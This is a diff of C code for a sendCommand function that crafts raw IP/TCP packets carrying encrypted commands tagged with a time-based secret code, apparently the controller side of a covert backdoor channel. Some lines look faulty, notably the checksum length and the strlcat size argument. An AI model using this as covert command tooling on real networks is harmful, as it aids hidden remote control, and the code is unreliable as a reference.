@@ -178,10 +178,10 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     char *encryptedField = NULL;
     int sock = 0;
     int one = 1;
-    int headerLength = 0;
+    int packetLength = 0;
     const int *val = &one;
-    struct ip *iph = (struct ip *) buffer;
-    struct tcphdr *tcph = (struct tcphdr *) (buffer + sizeof(struct ip));
+    struct ip *iph = NULL;
+    struct tcphdr *tcph = NULL;
     struct sockaddr_in sin;
     struct sockaddr_in din;
     struct tm *timeStruct;
@@ -191,12 +191,12 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     if (commandData != NULL)
     {
         // Get the length of the command
-        headerLength = strnlen(commandData, PATH_MAX);
+        packetLength = strnlen(commandData, PATH_MAX);
         // Allocate the buffer for the packet
         buffer = malloc(sizeof(char) * (sizeof(struct ip) +
-                                        sizeof(struct tcphdr) + headerLength + 2));
+                                        sizeof(struct tcphdr) + packetLength + 2));
         // Allocate the command buffer, add 3 for the command plus NULL
-        commandBuffer = malloc(sizeof(char) * (headerLength + 3));
+        commandBuffer = malloc(sizeof(char) * (packetLength + 3));
         
     }
     else
@@ -207,8 +207,10 @@ static void sendCommand(netInfo *info, int command, char *commandData)
         commandBuffer = malloc(sizeof(char) * 3);
     }
     
-    // Finish computing the total header length
-    headerLength += sizeof(struct ip) + sizeof(struct tcphdr) + 2;
+    // Finish computing the total header length and assign buffer to headers
+    packetLength += sizeof(struct ip) + sizeof(struct tcphdr) + 2;
+    iph = (struct ip *) buffer;
+    tcph = (struct tcphdr *) (buffer + sizeof(struct ip));
 
     // Get the time and create the secret code
     time(&t);
@@ -226,13 +228,12 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     din.sin_addr.s_addr = inet_addr((info->destHost));
     
     // Zero out the buffer
-    memset(buffer, 0, headerLength);
-    
+    memset(buffer, 0, packetLength);
     // IP structure
     iph->ip_hl = 5;
     iph->ip_v = 4;
     iph->ip_tos = 16;
-    iph->ip_len = headerLength;
+    iph->ip_len = packetLength;
     iph->ip_id = htons(54321);
     iph->ip_off = 0;
     iph->ip_ttl = 64;
@@ -263,11 +264,15 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     {
         strlcat(commandBuffer, commandData, strnlen(commandData, PATH_MAX));
     }
-    // Copy the command into the packet
-    memcpy(buffer + headerLength, commandBuffer, strnlen(commandBuffer, PATH_MAX));
+    
+    // Encrypt and copy the command into the packet
+    encryptedField = encrypt_data(commandBuffer, date, strnlen(commandBuffer, PATH_MAX));
+    
+    memcpy(buffer + sizeof(struct ip) + sizeof(struct tcphdr), encryptedField,
+           strnlen(commandBuffer, PATH_MAX));
     
     // IP checksum calculation
-    iph->ip_sum = csum((unsigned short *) buffer, (sizeof(struct ip) + sizeof(struct tcphdr)));
+    iph->ip_sum = csum((unsigned short *)buffer, 5);
     
     // Create the socket for sending the packets
     sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -296,7 +301,6 @@ static void sendCommand(netInfo *info, int command, char *commandData)
     
     free(buffer);
     free(commandBuffer);
-
 }
 
 static int getUserInput(char *commandData, int command)
